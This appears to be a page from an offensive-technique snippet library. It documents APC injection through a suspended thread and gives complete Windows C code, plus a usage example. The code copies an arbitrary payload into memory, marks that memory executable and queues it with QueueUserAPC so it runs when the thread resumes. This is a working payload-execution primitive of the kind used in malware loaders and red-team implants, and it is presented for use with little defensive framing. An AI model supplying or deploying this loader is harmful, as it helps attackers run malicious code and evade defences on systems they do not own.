## APC Injection via Suspended Thread

Executes a payload via APC injection using a suspended thread. The thread is created with `CREATE_SUSPENDED` running a benign `DummyFunction`. `RunViaApcInjection` allocates a `RW` region, copies the payload in, flips protection to `RWX` with `VirtualProtect`, and queues the payload's base address to the suspended thread via `QueueUserAPC`. The payload does not fire until the caller resumes the thread with `ResumeThread`.

**Usage**

Call `RunViaApcInjection` with the handle of a thread created with `CREATE_SUSPENDED` running `DummyFunction`, the payload buffer, and its size. After a `TRUE` return, call `ResumeThread` to trigger payload execution.

- `IN HANDLE hThread`  Handle to a thread created with `CREATE_SUSPENDED` running `DummyFunction`.
- `IN PBYTE pPayload`  Base address of the payload buffer to execute.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the APC was successfully queued, otherwise `FALSE`. The caller must call `ResumeThread` after a `TRUE` return to trigger execution.

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


// Benign dummy thread entry function used as the sacrificial thread.
// The thread is created suspended so this function never actually runs —
// execution is redirected to the payload via QueueUserAPC before resuming.
VOID DummyFunction() {
    int j = rand();
    int i = j + rand();
}


BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID   pAddress        = NULL;
    DWORD   dwOldProtection = NULL;

    // Allocate RW memory to hold the payload before making it executable.
    pAddress = VirtualAlloc(
        NULL,                       // Let the OS choose the base address.
        sPayloadSize,               // Size of the allocation in bytes.
        MEM_COMMIT | MEM_RESERVE,   // Reserve and commit pages in one call.
        PAGE_READWRITE              // RW only at allocation time; execute is added later.
    );
    if (pAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Copy the payload into the allocated region.
    memcpy(pAddress, pPayload, sPayloadSize);

    printf("\t[i] Payload Written To : 0x%p \n", pAddress);

    // Flip the memory protection from RW to RWX so the payload can execute.
    if (!VirtualProtect(
        pAddress,               // Base address of the region to modify.
        sPayloadSize,           // Size of the region in bytes.
        PAGE_EXECUTE_READWRITE, // New protection: read, write, and execute.
        &dwOldProtection        // Receives the previous protection value.
    )) {
        printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("\t[#] Press <Enter> To Run ... ");
    getchar();

    // Queue the payload to the suspended thread as an APC function.
    // The payload will not fire until the caller resumes the thread.
    if (!QueueUserAPC(
        (PAPCFUNC)pAddress, // Address of the APC function — payload base address.
        hThread,            // Handle to the suspended target thread.
        NULL                // No parameter passed to the APC function.
    )) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

**Example**

```c
HANDLE  hThread     = NULL;
DWORD   dwThreadId  = NULL;

// Create the thread suspended so the APC is queued before any code runs.
hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);

// Queue the payload while the thread is still suspended.
RunViaApcInjection(hThread, pPayload, sPayloadSize);

// ResumeThread triggers the queued APC — payload fires on first scheduling.
ResumeThread(hThread);

// Block until the payload thread finishes.
WaitForSingleObject(hThread, INFINITE);
```
